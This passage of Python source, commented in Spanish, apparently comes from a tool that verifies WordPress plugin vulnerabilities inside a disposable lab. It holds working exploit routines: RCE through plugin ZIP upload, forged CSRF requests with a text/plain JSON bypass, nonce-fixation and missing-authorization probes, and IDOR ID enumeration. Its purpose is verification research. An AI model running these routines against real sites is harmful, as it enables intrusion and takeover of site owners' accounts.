            boot, lab, slug, "POST", endpoint, base_params, file_param_hint, res, step,
            extra_nonce_pages=extra_nonce_pages)
        if not base_params.get(nonce_param_hint):
            res.detail = (f"no se pudo raspar un nonce real para la accion AJAX '{ajax_action}' "
                          f"de ninguna pagina del sitio -- sin nonce la peticion falla siempre "
                          f"(wp_verify_nonce), con o sin bug real detras")
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "ajax_action": ajax_action, "nonce_param": nonce_param_hint, "endpoint": endpoint,
        })

        token = _token()
        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
        expected = a + b
        zip_bytes = _build_minimal_plugin_zip(token, a, b)
        step(f"subiendo un ZIP de plugin minimo ('binoracle_shell_{token}') via accion AJAX "
             f"'{ajax_action}' (campo {file_param_hint}, contenido PHP que calcula {a}+{b})...")
        other_params = {k: v for k, v in base_params.items() if k != file_param_hint}
        try:
            resp = boot.sub_sess.post(
                boot.base_url + endpoint, data=other_params,
                files={file_param_hint: (f"binoracle_shell_{token}.zip", zip_bytes,
                                         "application/zip")},
                timeout=30)
        except Exception as e:
            res.detail = f"error de red subiendo el ZIP: {e}"
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res
        res.evidence["status_subida"] = resp.status_code
        res.evidence["respuesta_subida_recorte"] = (resp.text or "")[:500]

        found_path = lab.find_in_webroot(token, base_dir="wp-content/plugins")
        if not found_path:
            res.ok = True
            res.detail = (f"el ZIP se posteo a '{endpoint}' (action={ajax_action}, nonce real "
                          f"resuelto) pero ningun fichero con el token aparecio bajo "
                          f"wp-content/plugins -- Plugin_Upgrader->install() no lo acepto "
                          f"(capability real, validacion del ZIP, o el handler/accion no son los "
                          f"reales), no se confirma RCE")
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res
        rel = found_path.replace("/var/www/html", "", 1)
        candidate_url = boot.base_url + rel
        step(f"ZIP instalado en {found_path}; pidiendolo directo para ver si el PHP se EJECUTA...")
        try:
            r2 = boot.sub_sess.get(candidate_url, timeout=15)
        except Exception as e:
            res.detail = f"ZIP instalado en {found_path} pero error de red al pedirlo: {e}"
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res
        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
        executed = bool(pattern.search(r2.text or ""))
        res.evidence.update({
            "ruta_instalada": found_path, "url_publica": candidate_url,
            "status_code_respuesta": r2.status_code, "suma_esperada": expected,
            "suma_presente": executed, "respuesta_cuerpo_recorte": (r2.text or "")[:500],
        })
        res.ok = True
        if executed:
            res.verified = True
            res.detail = (f"RCE confirmada: el ZIP subido via la accion AJAX '{ajax_action}' se "
                          f"instalo como plugin real bajo {found_path} y, al pedirlo, el servidor "
                          f"EJECUTO su PHP (devolvio {expected}={a}+{b}, calculado por el "
                          f"interprete) -- cualquier usuario autenticado de bajo privilegio con "
                          f"el nonce correcto puede instalar codigo arbitrario")
            step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- RCE via "
                 f"Plugin_Upgrader->install().")
            step("capturando pantalla: el plugin instalado ejecutandose de verdad (prueba final)...")
            _capture_exploit_shot(
                boot, "GET", rel, r2, highlight=str(expected),
                caption_es=(f"Paso 5 (CLAVE): RCE via PLUGIN INSTALL CONFIRMADA — "
                            f"{candidate_url} devolvio {expected}={a}+{b} ejecutado por PHP. "
                            f"Accion AJAX: '{ajax_action}'."),
                caption_en=(f"Step 5 (KEY): RCE via PLUGIN INSTALL CONFIRMED — "
                            f"{candidate_url} returned {expected}={a}+{b} executed by PHP. "
                            f"AJAX action: '{ajax_action}'."))
            boot.capture(boot.sub_sess, rel,
                   f"Paso 5: RCE confirmado -- el ZIP de plugin se instalo via la accion AJAX "
                   f"'{ajax_action}' y SE EJECUTA como PHP (devuelve {expected}={a}+{b}).",
                   f"Step 5: RCE confirmed -- the plugin ZIP was installed via the AJAX action "
                   f"'{ajax_action}' and RUNS as PHP (returns {expected}={a}+{b}).")
        else:
            res.detail = (f"el ZIP se instalo bajo {found_path} pero pedir "
                          f"{candidate_url} no devolvio la suma calculada -- se guardo pero no se "
                          f"confirma que el PHP se ejecute (puede que WordPress bloquee la "
                          f"ejecucion de PHP en wp-content/plugins por configuracion del servidor)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_missing_auth_probe(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 600.0, companion_plugins: Optional[list] = None,
    keep_lab_on_failure: bool = False,
    confirm_string: Optional[str] = None,
    json_body: bool = False,
    post_verify_wp_option: Optional[str] = None,
    post_verify_expected: Optional[str] = None,
    setup_wp_options: Optional[list] = None,
    setup_wp_commands: Optional[list] = None,
) -> WpVerifyResult:
    """Sonda no-autenticada para information-disclosure / missing-authorization.

    Para CVEs donde un endpoint AJAX devuelve datos sensibles sin comprobar autenticacion.
    Si `confirm_string` esta en el body de la respuesta, pone verified=True (prueba dura de
    information-disclosure: el contenido sensible especifico fue expuesto sin auth).
    Si no hay confirm_string, solo pone ok=True si el endpoint responde con contenido no trivial
    sin login (HTTP 200 + body no vacio que no sea solo el error estandar de WordPress 'You need
    to log in').

    Esta verificacion es DEBIL (solo prueba que el endpoint responde, no que devuelve datos
    de otra cuenta), pero es evidencia real de que la comprobacion de autenticacion falta."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()
    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins)
        if boot is None:
            res.detail = "fallo al arrancar el laboratorio WordPress"
            return res

        # Pre-attack WP option setup (e.g., registrar clave UDRPC antes del ataque)
        if setup_wp_options:
            for opt in setup_wp_options:
                _opt_name = (opt or {}).get("name") if isinstance(opt, dict) else None
                if not _opt_name:
                    continue
                _opt_val = (opt or {}).get("value", "1")
                step(f"probe: activando opcion pre-ataque '{_opt_name}'={_opt_val!r}...")
                lab.wp_cli("option", "update", _opt_name, str(_opt_val), timeout=30)

        # Pre-attack arbitrary WP CLI commands (e.g., seed plugin DB tables)
        if setup_wp_commands:
            for cmd in setup_wp_commands:
                if not cmd:
                    continue
                _cmd_args = cmd if isinstance(cmd, list) else str(cmd).split()
                step(f"probe: ejecutando comando pre-ataque: {_cmd_args[:3]}...")
                lab.wp_cli(*_cmd_args, timeout=60)

        m = (http_method or "POST").upper()
        params_dict = (parameters if isinstance(parameters, dict)
                       else dict.fromkeys(parameters or [], ""))

        # Probamos como sesion ANONIMA (sin cookies de autenticacion)
        anon_sess = _make_session()
        try:
            r = anon_sess.request(
                m, boot.base_url + endpoint,
                json=params_dict if (m not in ("GET", "HEAD") and json_body) else None,
                data=params_dict if (m not in ("GET", "HEAD") and not json_body) else None,
                params=params_dict if m == "GET" else None,
                timeout=20, allow_redirects=True)
            status = r.status_code
            body = (r.text or "")[:2000]
        except Exception as _e:
            res.detail = f"error de red al probar endpoint: {_e}"
            return res

        # Señales de que el endpoint SÍ comprueba autenticacion
        _AUTH_REJECT_SIGNALS = (
            "you need to log in", "log in to continue", "login_required",
            "must be logged in", "nonce verification failed",
            "you do not have permission", "forbidden", "unauthorized",
            "-1",  # WordPress AJAX responde -1 cuando el nonce es invalido
        )
        body_low = body.lower()
        _rejected = (status in (401, 403) or
                     any(s in body_low for s in _AUTH_REJECT_SIGNALS) or
                     (status == 200 and body.strip() in ("", "0", "-1", "null")))

        res.evidence["status_anonimo"] = status
        res.evidence["body_recorte"] = body[:300]
        res.evidence["endpoint"] = endpoint
        res.evidence["metodo"] = m

        boot.capture(anon_sess, endpoint,
                     f"Sonda no-auth: {m} {endpoint} → HTTP {status}",
                     f"No-auth probe: {m} {endpoint} → HTTP {status}")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures

        if _rejected:
            res.ok = True
            res.detail = (f"el endpoint responde HTTP {status} o devuelve senal de rechazo "
                          f"('{body.strip()[:60]}') sin autenticacion — la comprobacion parece "
                          f"activa en esta version; probable version ya parchada")
        else:
            res.ok = True
            # Si hay confirm_string y aparece en el body, el information-disclosure esta probado
            if confirm_string and confirm_string.lower() in body.lower():
                res.verified = True
                res.detail = (f"sonda no-auth: endpoint responde HTTP {status} con la cadena "
                              f"de confirmacion '{confirm_string}' en el body — information "
                              f"disclosure confirmada sin autenticacion (prueba dura)")
            elif post_verify_wp_option and post_verify_expected:
                # Verificación post-ataque: comprobar si una opción WP cambió (priv esc)
                step(f"post-verify: comprobando opcion WP '{post_verify_wp_option}'...")
                _r_opt = lab.wp_cli("option", "get", post_verify_wp_option, timeout=30)
                _opt_actual = (_r_opt.stdout or "").strip() if _r_opt else ""
                if post_verify_expected.lower() in _opt_actual.lower():
                    res.verified = True
                    res.detail = (f"sonda no-auth: opcion WP '{post_verify_wp_option}' cambiada "
                                  f"a '{_opt_actual}' sin autenticacion — escalada de privilegios "
                                  f"confirmada (prueba dura via wp-cli post-ataque)")
                else:
                    res.detail = (f"sonda no-auth: endpoint respondio HTTP {status} sin auth, "
                                  f"pero opcion '{post_verify_wp_option}'='{_opt_actual}' "
                                  f"(esperado: '{post_verify_expected}') — impacto no confirmado")
            else:
                # Strengthen weak probe: compare anonymous response with subscriber.
                # If both get the same content, the endpoint clearly skips auth checks.
                # If subscriber gets 401/403 but anon gets 200, it's a broken-access anomaly.
                # If anon == admin, the endpoint leaks admin-only data unauthenticated.
                _cmp_detail = ""
                try:
                    _sub_ok = _wp_login(
                        boot.base_url, boot.sub_user, boot.sub_pass, on_step=step)
                    if _sub_ok:
                        _r_sub = _sub_ok.request(
                            m, boot.base_url + endpoint,
                            json=params_dict if (m not in ("GET","HEAD") and json_body) else None,
                            data=params_dict if (m not in ("GET","HEAD") and not json_body) else None,
                            params=params_dict if m == "GET" else None,
                            timeout=15, allow_redirects=True)
                        _sub_st = _r_sub.status_code
                        _sub_body = (_r_sub.text or "")[:2000]
                        res.evidence["status_subscriber"] = _sub_st
                        res.evidence["body_subscriber_recorte"] = _sub_body[:200]
                        if _sub_st in (401, 403):
                            _cmp_detail = (
                                f" — subscriber rechazado (HTTP {_sub_st}) pero anonimo pasa "
                                f"(HTTP {status}): broken-access-control")
                            res.evidence["privilege_comparison"] = "anon=pass subscriber=reject"
                        elif abs(len(_sub_body) - len(body)) < max(50, len(body) * 0.1):
                            _cmp_detail = (
                                f" — mismo contenido para anonimo y subscriber ({len(body)}B ≈ "
                                f"{len(_sub_body)}B): el endpoint no diferencia usuarios")
                            res.evidence["privilege_comparison"] = "anon==subscriber (no auth check)"
                        else:
                            _cmp_detail = (
                                f" — respuesta anonima ({len(body)}B) difiere de subscriber "
                                f"({len(_sub_body)}B): posible filtrado por rol")
                            res.evidence["privilege_comparison"] = f"anon={len(body)}B sub={len(_sub_body)}B"
                except Exception:
                    pass
                res.detail = (f"sonda no-auth: el endpoint responde HTTP {status} con contenido "
                              f"no trivial ({len(body)} bytes) sin autenticacion{_cmp_detail} — "
                              f"evidencia de que la comprobacion de autenticacion falta")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_csrf(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica CSRF reproduciendo la peticion de cambio de email/password que la hipotesis
    describe, pero con el escenario classico de self-CSRF: el ADMIN se ataca a si mismo via una
    pagina ajena que visita por error. La peticion:
      - usa la sesion YA autenticada del propio admin (con su password ORIGINAL).
      - quita activamente cualquier parametro cuyo nombre contenga 'nonce'/'token'/'csrf', aunque
        la hipotesis lo citara -- queremos la peticion mas desnuda posible, para no confundir un
        nonce correcto que colase por casualidad con una proteccion real.
      - manda Origin/Referer de un dominio EXTERNO ficticio (simulando que vino de una pagina
        ajena, no de wp-admin).
    Se marca verificado SOLO si el efecto ocurrio de verdad (segundo login con la password nueva,
    o lectura del email realmente cambiado en la base de datos) -- igual de exigente que
    verify_wordpress_account_takeover, no un 200/302 solo."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de CSRF (self-targeting) necesita un parametro "
                               "de email o de password; afina 'parameters' en la hipotesis del "
                               "LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins)
        if boot is None:
            return res
        if boot.admin_sess is None:
            res.detail = ("no se pudo autenticar como admin con su password original -- no se "
                          "puede simular el self-CSRF sin esa sesion")
            return res

        m = (http_method or "POST").upper()
        payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        for k in list(payload.keys()):
            if any(h in k.lower() for h in ("nonce", "token", "csrf")):
                del payload[k]
        new_email = f"csrf-takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass
        id_p = _pick_param(parameters, _ID_HINTS)
        if id_p:
            payload[id_p] = boot.admin_id

        headers_base = {"Origin": "https://binoracle-csrf-lab.invalid",
                        "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
        res.evidence.update({
            "admin_user": boot.admin_user, "admin_password_original": boot.admin_pass,
            "payload_forjado": payload, "origin_ficticio": headers_base["Origin"],
            "metodo": m, "endpoint": endpoint,
        })

        def check_effect():
            """Relee el estado real (segundo login o DB) tras CADA intento de entrega -- nunca se
            confirma por un 200/302 solo."""
            if new_pass:
                sess = _wp_login(boot.base_url, boot.admin_user, new_pass)
                return sess is not None
            if new_email:
                r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
                return (r.stdout or "").strip() == new_email
            return False

        # Capture BEFORE state so evidence shows what changed
        before_state: dict = {}
        try:
            if new_email:
                _r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
                before_state["email_before"] = (_r.stdout or "").strip()
            elif new_pass:
                before_state["password_before"] = boot.admin_pass
        except Exception:
            pass
        res.evidence["before_state"] = before_state

        # variantes de ENTREGA: la peticion normal del metodo declarado (form-encoded, como la
        # haria un <form> real), JSON (si el endpoint es una API REST que espera un body JSON), y
        # el truco clasico de JSON-via-text/plain -- un <form> SI puede mandar Content-Type:
        # text/plain con un body de texto arbitrario (sin preflight CORS), asi que si el
        # endpoint hace json_decode($raw_body) sin mirar el Content-Type, este bypass funciona
        # igual que un <form> normal, sin necesitar JavaScript ni fetch().
        import json as _json_mod
        delivery_attempts = [
            ("form-encoded (formulario real)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=payload if m != "GET" else None,
                params=payload if m == "GET" else None, headers=headers_base, timeout=20)),
            ("JSON (application/json)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, json=payload,
                headers={**headers_base, "Content-Type": "application/json"}, timeout=20)),
            ("JSON via text/plain (bypass de preflight, enviable desde un <form>)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=_json_mod.dumps(payload),
                headers={**headers_base, "Content-Type": "text/plain"}, timeout=20)),
        ]
        confirmed = False
        delivery_tried = []
        for label, send_fn in delivery_attempts:
            step(f"enviando la peticion forjada -- {label}, sesion del admin, SIN nonce, "
                 f"Origin/Referer externo ficticio...")
            try:
                resp = send_fn()
                status = resp.status_code
            except Exception as e:
                delivery_tried.append({"modo": label, "error": str(e)})
                continue
            ok_effect = check_effect()
            delivery_tried.append({"modo": label, "status": status, "efecto_confirmado": ok_effect})
            if ok_effect:
                confirmed = True
                res.evidence["modo_entrega_ganador"] = label
                res.evidence["status_code_respuesta"] = status
                break
        res.evidence["intentos_entrega"] = delivery_tried
        if new_pass:
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            res.evidence["email_esperado"] = new_email

        # Nonce fixation check: harvest a valid nonce as admin, then try submitting it from anon.
        # If the endpoint accepts an admin-harvested nonce from the anon session, that is a
        # cross-session nonce reuse (the nonce is not tied to the requesting session).
        try:
            step("csrf: comprobando fijacion de nonce (nonce de admin enviado desde sesion anonima)...")
            anon_sess_nf = _make_session()
            # Harvest nonce from a wp-admin form page as admin
            _nf_page = boot.admin_sess.get(
                boot.base_url + "/wp-admin/options-general.php", timeout=15, allow_redirects=True)
            _nf_nonce = None
            _nf_match = re.search(r'["\']_wpnonce["\']\s*:\s*["\']([a-f0-9]+)["\']', _nf_page.text or "")
            if not _nf_match:
                _nf_match = re.search(r'name=["\']_wpnonce["\'].*?value=["\']([a-f0-9]+)["\']',
                                      (_nf_page.text or ""), re.S)
            if _nf_match:
                _nf_nonce = _nf_match.group(1)
            if _nf_nonce:
                _nf_payload = {**payload, "_wpnonce": _nf_nonce}
                # Revert the state-changing parameters to the original values
                # so we don't repeat the same attack on an already-changed account
                _nf_new_email = f"noncefixation-{_token()}@binoracle-lab.invalid"
                if email_p:
                    _nf_payload[email_p] = _nf_new_email
                _nf_resp = anon_sess_nf.request(
                    m, boot.base_url + endpoint, data=_nf_payload if m != "GET" else None,
                    params=_nf_payload if m == "GET" else None,
                    headers={"Origin": "https://binoracle-csrf-lab.invalid",
                             "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"},
                    timeout=15)
                _nf_accepted = _nf_resp.status_code not in (401, 403)
                # Check if the state actually changed using the new email
                _nf_effect = False
                if email_p and _nf_accepted:
                    _r2 = lab.wp_cli("user", "get", boot.admin_user,
                                     "--field=user_email", timeout=20)
                    _nf_effect = ((_r2.stdout or "").strip() == _nf_new_email)
                res.evidence["nonce_fixation"] = {
                    "nonce_harvested": _nf_nonce,
                    "anon_status": _nf_resp.status_code,
                    "anon_accepted": _nf_accepted,
                    "state_changed": _nf_effect,
                    "finding": "CROSS-SESSION NONCE REUSE" if _nf_effect else (
                        "nonce accepted by server but no state change" if _nf_accepted else
                        "nonce rejected from anon session (nonce is session-bound)"),
                }
                if _nf_effect:
                    step("csrf: NONCE FIXATION CONFIRMADA — nonce de admin funciona desde sesion anonima")
                    res.evidence["nonce_fixation_confirmed"] = True
        except Exception:
            pass

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"CSRF confirmado ({res.evidence['modo_entrega_ganador']}): una "
                          f"peticion SIN nonce, con Origin/Referer de un dominio externo "
                          f"ficticio, usando la sesion YA autenticada del admin, cambio de "
                          f"verdad su propia cuenta -- el endpoint no comprueba nonce ni origen")
            step(f"VERIFICADO: CSRF confirmado ({res.evidence['modo_entrega_ganador']}) -- la "
                 f"peticion forjada sin nonce cambio la cuenta del admin.")
            # Screenshot HTTP del request forjado y de la verificación del efecto
            _csrf_resp = res.evidence.get("respuesta_entrega_ganadora", "")
            _csrf_status = res.evidence.get("status_entrega_ganadora", 200)
            _csrf_mode = res.evidence.get("modo_entrega_ganador", "")
            _csrf_body = (f"[CSRF CONFIRMED]\nForged request without nonce accepted.\n\n"
                          f"Mode: {_csrf_mode}\nOrigin: {headers_base['Origin']}\n"
                          f"Effect: admin account modified (password/email changed)\n\n"
                          f"Response body (truncated):\n{_csrf_resp[:400]}")
            _capture_terminal_shot(
                boot, "binoracle · CSRF evidence — forged request accepted",
                content=_csrf_body, highlight="CONFIRMED",
                caption_es=(f"Paso 5 (CLAVE): CSRF CONFIRMADO — peticion sin nonce aceptada "
                            f"({_csrf_mode}), cuenta del admin modificada. Endpoint: {endpoint}"),
                caption_en=(f"Step 5 (KEY): CSRF CONFIRMED — nonce-less request accepted "
                            f"({_csrf_mode}), admin account modified. Endpoint: {endpoint}"),
                url=boot.base_url + endpoint)
        else:
            res.ok = True
            res.detail = (f"se probaron {len(delivery_tried)} formas de entrega (form-encoded, "
                          f"JSON, JSON via text/plain) de la peticion forjada y en ninguna se "
                          f"confirmo el efecto -- el CSRF no se confirmo (puede que el endpoint "
                          f"SI compruebe nonce/origen, o que el payload/endpoint no sean los "
                          f"reales)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_idor(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
    companion_plugins: Optional[list] = None,
    keep_lab_on_failure: bool = False,
    confirm_string: Optional[str] = None,
    json_body: bool = False,
) -> WpVerifyResult:
    """Verifica IDOR (Insecure Direct Object Reference) en WordPress.

    Pasos:
    1. Crea un post PRIVADO como admin (wp post create --post_status=private).
    2. Verifica que un anonimo NO puede leerlo via el permalink normal (prueba de control).
    3. Accede via el endpoint vulnerable como anonimo con el ID del post privado.
       Si la respuesta contiene datos del post (titulo, contenido), IDOR confirmado.
    4. Enumeracion: prueba IDs adyacentes (id-1, id, id+1) para demostrar el alcance
       de la enumeracion en la evidencia.
    5. Comprueba la frontera de privilegios: anon puede leer item del admin pero subscriber
       no puede leer via el endpoint directo (si es un verdadero IDOR vs. missing-auth).
    """
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()
    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins)
        if boot is None:
            res.detail = "fallo al arrancar el laboratorio WordPress"
            return res

        m = (http_method or "GET").upper()
        params_base = (parameters if isinstance(parameters, dict)
                       else dict.fromkeys(parameters or [], ""))
        id_p = id_param_hint or _pick_param(parameters, _ID_HINTS) or "id"

        # 1. Create a private post as admin and get its ID
        step("idor: creando post privado como admin para usar como objeto de prueba...")
        _secret_content = f"BINORACLE-IDOR-SECRET-{_token()}"
        _create = lab.wp_cli("post", "create",
                             "--post_title=binoracle-idor-test",
                             f"--post_content={_secret_content}",
                             "--post_status=private",
                             "--porcelain",
                             timeout=30)
        _post_id_str = (_create.stdout or "").strip()
        _post_id = None
        if _post_id_str.isdigit():
            _post_id = int(_post_id_str)
        if not _post_id:
            res.detail = "no se pudo crear el post de prueba via wp-cli"
            res.ok = True
            return res
        step(f"idor: post privado creado con ID={_post_id}")

        # 2. Control check: anon CANNOT read via normal permalink
        anon_sess = _make_session()
        _permalink_r = anon_sess.get(
            f"{boot.base_url}/?p={_post_id}", timeout=15, allow_redirects=True)
        _anon_direct_blocked = (_permalink_r.status_code in (401, 403, 404) or
                                _secret_content not in (_permalink_r.text or ""))
        res.evidence["control_permalink_blocked"] = _anon_direct_blocked
        res.evidence["control_permalink_status"] = _permalink_r.status_code

        # 3. Try vulnerable endpoint as anon with the private post ID
        _exploit_params = {**params_base, id_p: str(_post_id)}
        step(f"idor: probando endpoint {endpoint!r} con ID={_post_id} como anonimo...")
        try:
            _exploit_r = anon_sess.request(
                m, boot.base_url + endpoint,
                json=_exploit_params if (m not in ("GET", "HEAD") and json_body) else None,
                data=_exploit_params if (m not in ("GET", "HEAD") and not json_body) else None,
                params=_exploit_params if m == "GET" else None,
                timeout=20, allow_redirects=True)
            _exploit_status = _exploit_r.status_code
            _exploit_body = (_exploit_r.text or "")[:2000]
        except Exception as _e:
            res.detail = f"error de red al probar endpoint IDOR: {_e}"
            res.ok = True
            return res

        res.evidence["idor_endpoint"] = endpoint
        res.evidence["idor_id_param"] = id_p
        res.evidence["idor_post_id"] = _post_id
        res.evidence["idor_status"] = _exploit_status
        res.evidence["idor_body_snippet"] = _exploit_body[:300]

        _secret_found = _secret_content in _exploit_body
        _confirm_found = (confirm_string and confirm_string.lower() in _exploit_body.lower())
        _idor_succeeded = _secret_found or _confirm_found

        # 4. ID enumeration: probe adjacent IDs to show enumeration surface
        step("idor: enumerando IDs adyacentes...")
        _enumerated: list = []
        for _adj_id in [max(1, _post_id - 1), _post_id, _post_id + 1]:
            try:
                _adj_params = {**params_base, id_p: str(_adj_id)}
                _adj_r = anon_sess.request(
                    m, boot.base_url + endpoint,
                    json=_adj_params if (m not in ("GET", "HEAD") and json_body) else None,
                    data=_adj_params if (m not in ("GET", "HEAD") and not json_body) else None,
                    params=_adj_params if m == "GET" else None,
                    timeout=15, allow_redirects=True)
                _non_trivial = (_adj_r.status_code == 200 and
                                len(_adj_r.text or "") > 20 and
                                (_adj_r.text or "").strip() not in ("", "0", "-1", "null"))
                _enumerated.append({
                    "id": _adj_id,
                    "status": _adj_r.status_code,
                    "accessible": _non_trivial,
                    "body_len": len(_adj_r.text or ""),
                })
            except Exception:
                pass
        res.evidence["enumerated_ids"] = _enumerated

        # 5. Privilege boundary: check that subscriber also gets blocked on normal permalink
        # but can access the vulnerable endpoint (proves it's IDOR, not just missing-auth)
        try:
            _sub_sess = _wp_login(boot.base_url, boot.sub_user, boot.sub_pass, on_step=step)
            if _sub_sess:
                _sub_pl = _sub_sess.get(
                    f"{boot.base_url}/?p={_post_id}", timeout=15, allow_redirects=True)
                _sub_direct_blocked = (_sub_pl.status_code in (401, 403, 404) or
                                       _secret_content not in (_sub_pl.text or ""))
                _sub_ep = _sub_sess.request(
                    m, boot.base_url + endpoint,
                    json=_exploit_params if (m not in ("GET", "HEAD") and json_body) else None,
                    data=_exploit_params if (m not in ("GET", "HEAD") and not json_body) else None,
                    params=_exploit_params if m == "GET" else None,
                    timeout=15, allow_redirects=True)
                res.evidence["privilege_bypass"] = {
                    "subscriber_permalink_blocked": _sub_direct_blocked,
                    "subscriber_endpoint_status": _sub_ep.status_code,
                    "subscriber_endpoint_accessible": (
                        _sub_ep.status_code == 200 and len(_sub_ep.text or "") > 20),
                    "finding": (
                        "IDOR: anon can access private post via endpoint (permalink blocked)" if (
                            _idor_succeeded and _anon_direct_blocked)
                        else "endpoint bypasses WP access control for all roles"),
                }
        except Exception:
            pass

        if _idor_succeeded and _anon_direct_blocked:
            res.verified = True
            res.ok = True
            _why = "secreto del post encontrado en respuesta" if _secret_found else f"confirm_string '{confirm_string}' encontrada"
            res.detail = (f"IDOR confirmado: post privado (ID={_post_id}) inaccesible via "
                          f"permalink (HTTP {_permalink_r.status_code}) pero accesible via "
                          f"endpoint {endpoint!r} como anonimo ({_why}). "
                          f"{len([e for e in _enumerated if e.get('accessible')])} de "
                          f"{len(_enumerated)} IDs adyacentes tambien accesibles.")
            step(f"VERIFICADO: IDOR confirmado — post privado leido como anonimo via {endpoint!r}")
        elif _idor_succeeded:
            res.ok = True
            res.detail = (f"IDOR parcial: endpoint devolvio contenido del post (ID={_post_id}) "
                          f"pero el permalink tampoco bloqueo el acceso (acceso WP roto en este lab)")
        else:
            res.ok = True
            res.detail = (f"IDOR no confirmado: endpoint {endpoint!r} respondio HTTP "
                          f"{_exploit_status} pero no se encontro el contenido del post privado "
                          f"en la respuesta — puede que el ID o endpoint no sean los correctos")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_deserialization(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica insecure deserialization (PHP Object Injection) en DOS pasos, ambos con prueba
    dura (ver deserialize_gadgets.py para el porque de este diseño):

    1) ESTATICO: escanea el codigo REAL ya descargado del plugin (find_file_write_gadget) en
       busca de una clase con __wakeup()/__destruct() que escriba una propiedad publica
       (controlada por el atacante) a una ruta tambien publica (controlada por el atacante) via
       file_put_contents(). Si no encuentra ninguna, no se intenta nada mas -- sin un gadget real
       en el propio codigo, no hay nada que verificar sin inventarse una cadena de terceros.
    2) DINAMICO: construye el objeto PHP serializado de verdad con esa clase (secrets.token_hex
       como contenido, una ruta canario como destino), lo manda al parametro/endpoint que la
       hipotesis cita, y confirma leyendo el fichero REAL dentro del contenedor -- si el
       CONTENIDO EXACTO aparece ahi, es prueba de que unserialize() reconstruyo el objeto de
       verdad y su metodo magico se ejecuto, no una deduccion por status code."""
